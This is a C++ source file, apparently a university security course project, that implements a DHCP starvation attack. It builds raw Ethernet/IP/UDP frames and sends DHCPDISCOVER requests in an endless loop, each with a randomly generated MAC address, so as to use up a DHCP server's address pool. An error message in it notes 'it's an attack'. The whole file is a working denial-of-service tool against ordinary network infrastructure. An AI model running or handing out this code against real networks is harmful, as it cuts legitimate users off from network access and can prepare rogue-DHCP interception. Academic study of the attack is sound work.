/*
 * File: starve.cpp
 * Date: 21.4.2018
 * Name: DHCP Starvation, PDS project
 * Author: Patrik Segedy <xseged00@vutbr.cz>
 * Description: DHCP Starvation
 */

#include "dhcp.h"
#include "checksum.h"
#include "starve.h"

//global variable for socket handle
int socket_handle = -1;

using namespace std;

int main(int argc, char const *argv[]) {
    srand(time(nullptr));

    uint8_t mac[6] = {};
    int len = 0;
    struct ifreq if_idx;
    struct sockaddr_ll sa;
    char frame[PKT_LEN];
    struct ether_header *eh = (struct ether_header *)frame;
    struct ip *ip_h = (struct ip *) (frame + sizeof(struct ether_header));
    struct udphdr *udp_h = (struct udphdr *) (((char *) ip_h) + sizeof(struct ip));
    dhcp_packet *dhcp = (dhcp_packet *) (((char *) udp_h) + sizeof(udphdr));

    // generate random mac
    gen_mac(mac);

    memset(frame, 0, PKT_LEN);
    // create RAW UDP socket
    cout << "creating socket" << endl;
    if ((socket_handle = socket(PF_PACKET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        cerr << "ERROR: Failed to create socket" << endl;
        return EXIT_FAILURE;
    }

    // Get index of interface
    memset(&if_idx, 0, sizeof(struct ifreq));
    strncpy(if_idx.ifr_name, argv[1], IFNAMSIZ-1);
    if (ioctl(socket_handle, SIOCGIFINDEX, &if_idx) < 0)
         cerr << "err SIOCGIFINDEX" << endl;

    // set sockaddr_ll struct
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = if_idx.ifr_ifindex;
    sa.sll_halen = ETH_ALEN;
    sa.sll_protocol = htons(ETH_P_ALL);
    memset(sa.sll_addr, -1, ETHER_ADDR_LEN);

    // DHCP packet
    memset(dhcp, 0, sizeof(dhcp_packet));
    dhcp->op = BOOTREQUEST;
    dhcp->htype = 1;
    dhcp->hlen = 6;
    memcpy(dhcp->chaddr, mac, ETHER_ADDR_LEN);
    dhcp->cookie = htonl(MAGIC_COOKIE);
    // message type - discover
    dhcp->options[0] = 53;
    dhcp->options[1] = 1;
    dhcp->options[2] = DHCPDISCOVER;
    //end
    dhcp->options[3] = 255;
    len += 3 * sizeof(u_char) + 240;

    // Create UDP header
    len += sizeof(struct udphdr) + 1;
    udp_h->uh_sport = htons(CLIENT_PORT);
    udp_h->uh_dport = htons(SERVER_PORT);
    udp_h->uh_ulen = htons(len);
    udp_h->uh_sum = 0;

    // Make ip header
    len += sizeof(struct ip);
    ip_h->ip_hl = 5;
    ip_h->ip_v = 4;
    ip_h->ip_tos = 0x10;
    ip_h->ip_len = htons(len);
    ip_h->ip_id = htons(0xffff);
    ip_h->ip_ttl = 64; // hops
    ip_h->ip_p = IPPROTO_UDP;
    ip_h->ip_src.s_addr = htonl(INADDR_ANY);
    ip_h->ip_dst.s_addr = htonl(INADDR_BROADCAST);
    // ip_h->ip_sum = 0; // try without checksum
    ip_h->ip_sum = in_cksum((unsigned short *) ip_h, sizeof(struct ip));

    // Ethernet header
    len += sizeof(struct ether_header);
    memcpy(eh->ether_shost, mac, ETHER_ADDR_LEN);
    memset(eh->ether_dhost, -1,  ETHER_ADDR_LEN);
    eh->ether_type = htons(ETHERTYPE_IP);

    // bind socket to device
    if (bind(socket_handle, (struct sockaddr*) &sa, sizeof(sa)) < 0) {
        cerr << "ERROR: Failed to bind" << endl;
        close(socket_handle);
        return EXIT_FAILURE;
    }

    while(1) {
        // generate new MAC
        gen_mac(mac);
        memcpy(eh->ether_shost, mac, ETHER_ADDR_LEN);
        memcpy(dhcp->chaddr, mac, ETHER_ADDR_LEN);
        // new xid
        dhcp->xid = (uint32_t) mac;
        // send
        if (sendto(socket_handle, frame, len, 0, (sockaddr *)&sa, sizeof(struct sockaddr_ll)) < 0)
            cerr << "ERROR: sendto DISCOVER -> continue it's an attack" << endl;
    }

    close(socket_handle);
    return 0;
}

void handleSignal(int signal) {
    if (socket_handle != -1)
        close(socket_handle);
    exit(signal);
}

// generate random MAC address
void gen_mac(uint8_t (&mac)[6]) {
    for (int i = 0; i < 6; i++)
        mac[i] = rand() % 256;
}
